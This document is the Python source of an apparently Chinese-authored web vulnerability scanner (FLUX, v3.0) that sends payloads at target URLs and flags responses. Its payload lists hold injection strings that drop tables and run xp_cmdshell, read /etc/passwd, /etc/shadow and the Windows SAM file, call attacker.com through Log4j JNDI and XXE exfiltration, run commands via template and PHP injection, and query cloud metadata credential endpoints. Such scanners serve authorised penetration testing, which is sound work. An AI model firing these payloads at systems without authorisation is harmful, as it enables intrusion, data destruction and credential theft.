#!/usr/bin/env python3
"""
增强版漏洞测试模块 v3.0 - FLUX
支持交互式DNSLog、更多Payload种类、WAF绕过技术
"""

import re
import time
import json
import logging
import base64
import random
import string
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse, parse_qs, urlencode, quote
import requests
from dataclasses import dataclass

logger = logging.getLogger(__name__)


# 全局DNSLog配置（用于SSRF测试）
DNSLOG_DOMAIN = None

def set_dnslog_domain(domain: str):
    """设置全局DNSLog域名"""
    global DNSLOG_DOMAIN
    DNSLOG_DOMAIN = domain
    logger.info(f"[*] DNSLog域名已设置: {domain}")

def get_dnslog_domain() -> Optional[str]:
    """获取当前DNSLog域名"""
    return DNSLOG_DOMAIN


def build_http_request(method: str, url: str, headers: dict = None, data: str = None, params: dict = None) -> str:
    """构建HTTP请求包字符串"""
    from urllib.parse import urlparse, urlencode
    
    parsed = urlparse(url)
    path = parsed.path
    if params:
        query = urlencode(params)
        path = f"{path}?{query}"
    elif parsed.query:
        path = f"{path}?{parsed.query}"
    
    request_lines = [f"{method.upper()} {path} HTTP/1.1"]
    request_lines.append(f"Host: {parsed.netloc}")
    
    default_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "*/*",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
    }
    
    if headers:
        default_headers.update(headers)
    
    for key, value in default_headers.items():
        request_lines.append(f"{key}: {value}")
    
    request_lines.append("")
    
    if data:
        if isinstance(data, dict):
            data = urlencode(data)
        request_lines.append(data)
    
    return "\r\n".join(request_lines)


def format_response(resp: requests.Response) -> str:
    """格式化HTTP响应为字符串"""
    lines = [f"HTTP/1.1 {resp.status_code} {resp.reason}"]
    for key, value in resp.headers.items():
        lines.append(f"{key}: {value}")
    lines.append("")
    try:
        content = resp.text[:2000]  # 限制长度
        lines.append(content)
    except:
        lines.append("[Binary Content]")
    return "\r\n".join(lines)


@dataclass
class VulnResult:
    vuln_type: str
    severity: str  # Critical, High, Medium, Low, Info
    url: str
    param: str
    payload: str
    detail: str
    evidence: str = ""
    request: str = ""
    response: str = ""


class VulnTesterEnhanced:
    """增强版漏洞测试器 (vuln_test_enhanced)"""
    
    # 静态资源扩展名列表
    STATIC_EXTENSIONS = ('.js', '.css', '.png', '.jpg', '.jpeg', '.gif', '.svg', '.ico', 
                        '.woff', '.woff2', '.ttf', '.eot', '.mp4', '.mp3', '.pdf', '.zip',
                        '.rar', '.7z', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx')
    
    # 静态资源Content-Type列表
    STATIC_CONTENT_TYPES = ('javascript', 'css', 'image', 'font', 'video', 'audio', 
                           'application/pdf', 'application/zip', 'application/octet-stream')
    
    def __init__(self, session: requests.Session, timeout: int = 10):
        self.session = session
        self.timeout = timeout
        self.findings: List[VulnResult] = []
        
        # 初始化所有Payload
        self._init_payloads()
    
    def _init_payloads(self):
        """初始化所有漏洞测试Payload - 多样化"""
        
        # ==================== SQL注入 Payloads (多样化) ====================
        self.SQLI_PAYLOADS = {
            "error_based": [
                "'", "\"", "`", ")", "')", "\")",
                "' AND 1=1--", "' AND 1=2--",
                "' OR '1'='1", "' OR '1'='1'--",
                "1' AND 1=1--", "1' AND 1=2--",
                "1' OR '1'='1'--", "1' OR '1'='1'/*",
                "admin'--", "admin' #", "admin'/*",
                "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
                "' UNION SELECT 1,2,3--", "' UNION SELECT 1,2,3,4--",
                "' AND 1=CONVERT(int,@@version)--",
                "' AND 1=CONVERT(int,(SELECT @@version))--",
                "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--",
                "1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
            ],
            "time_based": [
                "1' AND SLEEP(5)--", "1' AND BENCHMARK(5000000,MD5('A'))--",
                "1'; WAITFOR DELAY '00:05'--", "1\"; WAITFOR DELAY '00:05'--",
                "1' AND pg_sleep(5)--", "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "1' AND IF(1=1,SLEEP(5),0)--", "1' AND (SELECT 3520 FROM (SELECT(SLEEP(5)))NNgT)--",
            ],
            "union_based": [
                "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT 1,2,3--",
                "' UNION SELECT 1,2,3,4--", "' UNION SELECT 1,2,3,4,5--",
                "' UNION ALL SELECT NULL--", "' UNION ALL SELECT 1,2,3--",
            ],
            "stacked": [
                "1; DROP TABLE users--", "1'; DROP TABLE users--",
                "1; INSERT INTO users VALUES('hacker','pass')--",
                "1'; EXEC xp_cmdshell 'dir'--",
            ],
            "waf_bypass": [
                "%27", "%%27", "%2527", "%u0027", "%u027",
                "1/**/OR/**/1=1", "1%0aOR%0a1=1", r"1\OR\1=1",
                "admin%27--", "admin%27%23", "admin%27/*",
                "%55nion(%53elect)", "%55nion%20%53elect",
                "/*!50000union*/ /*!50000select*/",
                "/*!union*/+/*!select*/",
                "+union+distinct+select+", "+union+distinctROW+select+",
                "'||'1'='1", "'||1--", "'||'1'='1'--",
            ]
        }
        
        # ==================== XSS Payloads (多样化) ====================
        self.XSS_PAYLOADS = {
            "basic": [
                "<script>alert(1)</script>",
                "<script>alert('XSS')</script>",
                "<script>alert(document.cookie)</script>",
                "<script>alert(document.domain)</script>",
            ],
            "img": [
                "<img src=x onerror=alert(1)>",
                "<img src=x onerror=alert('XSS')>",
                "<img src=1 onerror=alert(1)>",
                "<img src=javascript:alert(1)>",
            ],
            "svg": [
                "<svg onload=alert(1)>",
                "<svg/onload=alert(1)>",
                "<svg onload=alert('XSS')>",
                "<svg><script>alert(1)</script></svg>",
            ],
            "body": [
                "<body onload=alert(1)>",
                "<body onpageshow=alert(1)>",
                "<body onfocus=alert(1) autofocus>",
            ],
            "input": [
                "<input onfocus=alert(1) autofocus>",
                "<input onblur=alert(1) autofocus>",
                "<input type=text onmouseover=alert(1)>",
            ],
            "other_tags": [
                "<marquee onstart=alert(1)>",
                "<video><source onerror=alert(1)></video>",
                "<audio src=x onerror=alert(1)>",
                "<details open ontoggle=alert(1)>",
                "<select onfocus=alert(1) autofocus>",
                "<textarea onfocus=alert(1) autofocus>",
                "<iframe src=javascript:alert(1)>",
                "<object data=javascript:alert(1)>",
            ],
            "attribute": [
                "\"><script>alert(1)</script>",
                "'><script>alert(1)</script>",
                "\"><img src=x onerror=alert(1)>",
                "'><img src=x onerror=alert(1)>",
                "' onmouseover=alert(1) '",
                "\" onmouseover=alert(1) \"",
            ],
            "encoding": [
                "<script>eval(atob('YWxlcnQoMSk='))</script>",
                "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
                "<script>alert(String.fromCharCode(49))</script>",
                "<script>alert(/XSS/.source)</script>",
            ],
            "waf_bypass": [
                "<scr\x00ipt>alert(1)</scr\x00ipt>",
                "<ScRiPt>alert(1)</sCrIpT>",
                "<script>al\u0065rt(1)</script>",
                "<body onclick=alert(1)>",
                "<img src=x onerror=top[8680439..toString(30)](1)>",
                "<svg><animate onbegin=alert(1) attributeName=x>",
                "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
            ],
            "polyglots": [
                r"jaVasCript:/*-/*`/*\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e",
                'javascript:/*--></title></style></textarea></script></xmp><svg/onload="+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//">',
            ]
        }
        
        # ==================== LFI/Path Traversal Payloads (多样化) ====================
        self.LFI_PAYLOADS = [
            # Linux基础
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "....//....//etc/passwd",
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/etc/group",
            "/etc/motd",
            "/proc/self/environ",
            "/proc/self/cmdline",
            "/proc/version",
            "/proc/config.gz",
            "/proc/self/status",
            "/proc/self/fd/0",
            "/var/log/apache2/access.log",
            "/var/log/apache/access.log",
            "/var/log/nginx/access.log",
            "/var/www/html/index.php",
            "/var/www/html/config.php",
            
            # Windows基础
            "..\\..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\windows\\win.ini",
            "....//....//....//windows/win.ini",
            "C:\\Windows\\System32\\config\\SAM",
            "C:\\Windows\\win.ini",
            "C:\\boot.ini",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            
            # 编码绕过
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%252e%252e%252fetc%252fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
            "..%5c..%5c..%5cwindows%5cwin.ini",
            
            # Null字节截断
            "../../../etc/passwd%00",
            "../../../etc/passwd%00.jpg",
            
            # 伪协议
            "php://filter/read=convert.base64-encode/resource=index.php",
            "php://input",
            "file:///etc/passwd",
            "data://text/plain,<?php phpinfo(); ?>",
            "expect://id",
        ]
        
        # ==================== RCE Payloads (多样化) ====================
        self.RCE_PAYLOADS = {
            "command_injection": [
                # 基础命令
                ";ls", "|ls", "&ls", "`ls`", "$(ls)",
                ";id", "|id", "&id", "`id`", "$(id)",
                ";whoami", "|whoami", "&whoami", "`whoami`", "$(whoami)",
                ";pwd", "|pwd", "&pwd", "`pwd`", "$(pwd)",
                
                # 读取文件
                ";cat /etc/passwd", "|cat /etc/passwd", "`cat /etc/passwd`",
                ";head /etc/passwd", "|head /etc/passwd",
                ";tail /etc/passwd", "|tail /etc/passwd",
                
                # 多命令执行
                "&& ls", "|| ls", "; ls;",
                "&& whoami", "|| whoami", "; whoami;",
                "&& cat /etc/passwd", "|| cat /etc/passwd",
                
                # 编码绕过
                ";echo test123", "|echo test123", "`echo test123`",
                ";printf test123", "|printf test123",
                ";expr 1 + 1", "|expr 1 + 1",
                
                # 空格绕过
                ";ls${IFS}-la", "|ls${IFS}-la",
                ";cat${IFS}/etc/passwd",
                ";cat</etc/passwd",
                
                # 其他命令
                ";uname -a", "|uname -a",
                ";hostname", "|hostname",
                ";ifconfig", "|ifconfig",
                ";netstat -an", "|netstat -an",
            ],
            "expression_injection": [
                "${jndi:ldap://attacker.com/a}",
                "${${lower:j}ndi:ldap://attacker.com/a}",
                "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}",
                "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//attacker.com/a}",
                "${jndi:dns://attacker.com}",
                "${jndi:rmi://attacker.com/a}",
                "${jndi:iiop://attacker.com/a}",
                "${jndi:nis://attacker.com/a}",
                "${jndi:nds://attacker.com/a}",
                "${jndi:corba://attacker.com/a}",
                "${jndi:iiopname://attacker.com/a}",
            ],
            "template_injection": [
                "{{7*7}}",
                "{{7*'7'}}",
                "{{config}}",
                "{{self}}",
                "{{[].__class__.__base__.__subclasses__()}}",
                "{{''.__class__.__mro__[1].__subclasses__()}}",
                "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }",
                "${T(java.lang.Runtime).getRuntime().exec('id')}",
                "${T(java.lang.Runtime).getRuntime().exec('whoami')}",
                "#{T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}",
                "${class.getClassLoader()}",
            ],
            "php_code_injection": [
                "<?php phpinfo(); ?>",
                "<?php system('id'); ?>",
                "<?php echo shell_exec('id'); ?>",
                "<?php passthru('id'); ?>",
                "<?php exec('id'); ?>",
                "<?php eval('echo 1;'); ?>",
                "<?=system('id')?>",
                "${@phpinfo()}",
                "${@system('id')}",
            ],
            "deserialization": [
                "rO0ABXQAAAA=",
                "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa",
                "YToyOntpOjA7czo0OiJ0ZXN0IjtpOjE7czo0OiJ0ZXN0Ijt9",
                "TzoxMDoiRXhjZXB0aW9uIjoxOntzOjc6ImlkIiO1O3M6Mzoic3lzIjt9",
            ]
        }
        
        # ==================== SSRF Payloads (多样化 + DNSLog支持) ====================
        self.SSRF_PAYLOADS = {
            "internal": [
                "http://localhost",
                "http://127.0.0.1",
                "http://[::1]",
                "http://[0:0:0:0:0:0:0:1]",
                "http://0177.0.0.1",  # 八进制
                "http://2130706433",  # 十进制
                "http://0x7f.0x0.0x0.0x1",  # 十六进制
                "http://0x7f000001",  # 十六进制
            ],
            "cloud_metadata": [
                "http://169.254.169.254",
                "http://metadata.google.internal",
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
                "http://metadata.google.internal/computeMetadata/v1/project/project-id",
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://169.254.169.254/latest/user-data",
                "http://169.254.170.2/v2/credentials",
                "http://100.100.100.200/latest/meta-data/",  # 阿里云
                "http://100.100.100.200/latest/meta-data/instance-id",  # 阿里云
            ],
            "bypass": [
                "http://127.0.0.1.xip.io",
                "http://127.0.0.1.nip.io",
                "http://127.0.0.1.sslip.io",
                "http://www.127.0.0.1.xip.io",
                "http://127-0-0-1.nip.io",
            ],
            "protocols": [
                "file:///etc/passwd",
                "file:///C:/Windows/win.ini",
                "dict://127.0.0.1:22/",
                "ftp://127.0.0.1:22/",
                "gopher://127.0.0.1:22/",
                "ldap://127.0.0.1:389/",
                "tftp://127.0.0.1:69/",
            ]
        }
        
        # ==================== XXE Payloads (多样化) ====================
        self.XXE_PAYLOADS = [
            # 基础XXE
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><foo>&xxe;</foo>',
            
            # 外部DTD
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><foo>&xxe;</foo>',
            
            # 参数实体
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo></foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo></foo>',
            
            # 盲XXE
            "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///etc/passwd'><!ENTITY % eval '<!ENTITY exfil SYSTEM \"http://attacker.com/?%xxe;\"'>%eval;]><foo>&exfil;</foo>",
            
            # 其他文件
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>',
            
            # 内网探测
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:22/">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
        ]
        
        # ==================== NoSQL注入 Payloads ====================
        self.NOSQL_PAYLOADS = [
            # MongoDB
            '{"$gt": ""}',
            '{"$ne": null}',
            '{"$regex": ".*"}',
            '{"$where": "this.password.length > 0"}',
            "'; return true; //",
            "'; return 'a'=='a'; //",
            "'; return true; var dummy='",
            
            # 数组注入
            '{"username": {"$in": ["admin", "root"]}}',
            '{"username": {"$regex": "^ad"}}',
        ]
        
        # ==================== LDAP注入 Payloads ====================
        self.LDAP_PAYLOADS = [
            "*",
            "*)(&*",
            "*))%00",
            "admin*)((|userPassword=*)",
            "*)(uid=*))(&(uid=*",
            "*))(&(objectClass=*",
            ")(&(uid=*))(|(uid=*",
            "admin)(!(&(1=0)))",
            "*)(uid=*))(&(uid=*)(userPassword={MD5}*",
        ]
        
        # ==================== 命令注入检测特征 ====================
        self.RCE_INDICATORS = [
            'root:', 'uid=', 'gid=', '/bin/', '/sbin/',
            'www-data', 'apache', 'nginx', 'mysql',
            'test123', 'echo test', 'printf test',
            'Microsoft Windows', 'Windows NT', 'Program Files',
            'HOME=', 'PATH=', 'SHELL=', 'USER=',
            'drwxr-xr-x', '-rw-r--r--',
        ]
        
        # ==================== SQL错误特征 ====================
        self.SQLI_ERRORS = [
            "mysql_fetch", "mysql_num_rows", "sql syntax", "mysql error",
            "mysql_connect", "sqlsrv_connect", "odbc_connect", 
            "unterminated", "microsoft sql", "sqlserver_error",
            "postgresql", "pg_fetch", "sqlite3", "sql error",
            "ora-", "oracle error", "disallowed", "fatal error",
            "warning", "exception", "zend", "parse error",
            "undefined", "notice", "mysql", "syntax error",
            "invalid query", "data too long", "truncated",
            "division by zero", "incorrect syntax", "unexpected",
        ]
    
    def _is_static_resource(self, url: str, response: requests.Response = None) -> bool:
        """检查是否为静态资源，避免对静态文件进行漏洞测试"""
        # 检查URL扩展名
        url_lower = url.lower()
        if any(url_lower.endswith(ext) for ext in self.STATIC_EXTENSIONS):
            return True
        
        # 检查Content-Type
        if response:
            content_type = response.headers.get('Content-Type', '').lower()
            if any(ct in content_type for ct in self.STATIC_CONTENT_TYPES):
                return True
        
        return False
    
    def _generate_random_string(self, length: int = 8) -> str:
        """生成随机字符串"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    def test_ssrf_with_dnslog(self, url: str, params: Dict, method: str = "GET") -> List[VulnResult]:
        """
        SSRF测试 - 支持交互式DNSLog
        如果设置了DNSLog域名，会使用它进行盲SSRF测试
        """
        findings = []
        
        # 检查URL是否为静态资源
        if self._is_static_resource(url):
            logger.debug(f"SSRF检测跳过静态资源: {url}")
            return findings
        
        # 获取DNSLog域名
        dnslog_domain = get_dnslog_domain()
        
        # 构建基础Payload列表
        ssrf_payloads = []
        
        # 1. 内部地址测试
        ssrf_payloads.extend(self.SSRF_PAYLOADS.get("internal", []))
        ssrf_payloads.extend(self.SSRF_PAYLOADS.get("cloud_metadata", []))
        
        # 2. 如果有DNSLog，添加盲SSRF测试
        if dnslog_domain:
            random_id = self._generate_random_string(6)
            blind_payloads = [
                f"http://{random_id}.{dnslog_domain}",
                f"http://{random_id}.1.{dnslog_domain}",
                f"http://{random_id}.127.0.0.1.{dnslog_domain}",
                f"http://{random_id}.169.254.169.254.{dnslog_domain}",
            ]
            ssrf_payloads.extend(blind_payloads)
            logger.info(f"[*] 使用DNSLog进行盲SSRF测试: {dnslog_domain}")
        else:
            logger.info("[!] 未设置DNSLog域名，跳过盲SSRF测试")
            logger.info("    提示: 如需测试盲SSRF，请先访问 dnslog.cn 获取子域名")
        
        # 3. 绕过技巧
        ssrf_payloads.extend(self.SSRF_PAYLOADS.get("bypass", []))
        ssrf_payloads.extend(self.SSRF_PAYLOADS.get("protocols", []))
        
        for payload in ssrf_payloads:
            try:
                test_params = params.copy()
                for key in test_params:
                    test_params[key] = payload
                
                request_str = build_http_request(method, url, params=test_params)
                if method == "GET":
                    r = self.session.get(url, params=test_params, timeout=10)
                else:
                    r = self.session.request(method, url, data=test_params, timeout=10)
                response_str = format_response(r)
                
                content_lower = r.text.lower()
                
                # 检测内部地址访问成功
                if any(x in content_lower for x in ['localhost', '127.0.0.1', 'metadata', 'instance', 'internal', 'ami-id', 'instance-id']):
                    findings.append(VulnResult(
                        vuln_type="SSRF",
                        severity="High",
                        url=url,
                        param=str(list(params.keys())),
                        payload=payload,
                        detail="可能存在服务器端请求伪造漏洞",
                        evidence=r.text[:500],
                        request=request_str,
                        response=response_str
                    ))
                    break
                    
                # 检测云元数据
                if any(x in content_lower for x in ['compute.internal', 'ec2.internal', 'aliyun', 'qcloud']):
                    findings.append(VulnResult(
                        vuln_type="SSRF",
                        severity="Critical",
                        url=url,
                        param=str(list(params.keys())),
                        payload=payload,
                        detail="可能存在SSRF漏洞，可访问云元数据服务",
                        evidence=r.text[:500],
                        request=request_str,
                        response=response_str
                    ))
                    break
                    
            except Exception as e:
                if 'connection' in str(e).lower() or 'refused' in str(e).lower():
                    findings.append(VulnResult(
                        vuln_type="SSRF",
                        severity="High",
                        url=url,
                        param=str(list(params.keys())),
                        payload=payload,
                        detail="请求被拒绝，可能存在SSRF",
                        evidence=str(e),
                        request=request_str,
                        response=""
                    ))
                    break
        
        return findings
    
    def test_rce_enhanced(self, url: str, params: Dict, method: str = "GET") -> List[VulnResult]:
        """
        增强版RCE测试 - 更多Payload种类
        RCE测试场景:
        1. 命令注入（Command Injection）- 通过拼接符执行系统命令
        2. 代码注入（Code Injection）- 执行PHP/Python等代码
        3. 表达式注入（Expression Injection）- SpEL/OGNL等
        4. 模板注入（SSTI）- 服务端模板注入
        5. 反序列化（Deserialization）- 对象反序列化
        """
        findings = []
        
        if not params:
            return findings
        
        # 检查URL是否为静态资源
        if self._is_static_resource(url):
            logger.debug(f"RCE检测跳过静态资源: {url}")
            return findings
        
        param_name = list(params.keys())[0]
        
        # 测试所有类别的RCE Payload
        for category, payloads in self.RCE_PAYLOADS.items():
            logger.debug(f"[*] 测试 {category} 类型RCE")
            
            for payload in payloads[:5]:  # 每类取前5个测试
                try:
                    test_params = params.copy()
                    test_params[param_name] = payload
                    
                    if method == "POST":
                        resp = self.session.post(url, data=test_params, timeout=self.timeout)
                    else:
                        resp = self.session.get(url, params=test_params, timeout=self.timeout)
                    
                    # 检测RCE成功特征
                    resp_text = resp.text
                    resp_lower = resp.text.lower()
                    
                    is_vulnerable = False
                    evidence = ""
                    
                    # 1. 检测命令回显
                    if category == "command_injection":
                        if "test123" in resp_text or "49" in resp_text:
                            is_vulnerable = True
                            evidence = "命令回显: echo/printf 成功"
                        elif any(ind in resp_lower for ind in self.RCE_INDICATORS):
                            is_vulnerable = True
                            evidence = f"命令执行特征: {[i for i in self.RCE_INDICATORS if i in resp_lower][:2]}"
                    
                    # 2. 检测表达式注入
                    elif category == "expression_injection":
                        if "jndi" in payload.lower():
                            # Log4j JNDI注入 - 通常需要DNSLog验证
                            pass
                        elif "{{7*7}}" in payload and "49" in resp_text:
                            is_vulnerable = True
                            evidence = "表达式执行: 7*7=49"
                        elif "{{" in resp_text and "}}" in resp_text and "49" in resp_text:
                            is_vulnerable = True
                            evidence = "模板表达式执行"
                    
                    # 3. 检测模板注入
                    elif category == "template_injection":
                        if "49" in resp_text or "7*7" in resp_text:
                            is_vulnerable = True
                            evidence = "SSTI: 数学表达式执行"
                        elif "root:" in resp_lower or "uid=" in resp_lower:
                            is_vulnerable = True
                            evidence = "SSTI: 系统命令执行"
                        elif "java.lang.Runtime" in resp_text or "exec(" in resp_text:
                            is_vulnerable = True
                            evidence = "SSTI: Java代码执行"
                    
                    # 4. 检测PHP代码注入
                    elif category == "php_code_injection":
                        if "phpinfo" in resp_lower and "phpinfo()" not in payload:
                            is_vulnerable = True
                            evidence = "PHP代码执行: phpinfo()"
                        elif "system(" in resp_text or "shell_exec(" in resp_text:
                            is_vulnerable = True
                            evidence = "PHP命令执行"
                    
                    if is_vulnerable:
                        request_str = build_http_request(method, url, params=test_params)
                        response_str = format_response(resp)
                        
                        findings.append(VulnResult(
                            vuln_type="RCE",
                            severity="Critical",
                            url=url,
                            param=param_name,
                            payload=payload,
                            detail=f"远程代码执行 ({category}): {evidence}",
                            evidence=evidence,
                            request=request_str,
                            response=response_str
                        ))
                        return findings
                        
                except Exception as e:
                    logger.debug(f"RCE test error ({category}): {e}")
        
        return findings


# 保持向后兼容的类名
VulnTester = VulnTesterEnhanced
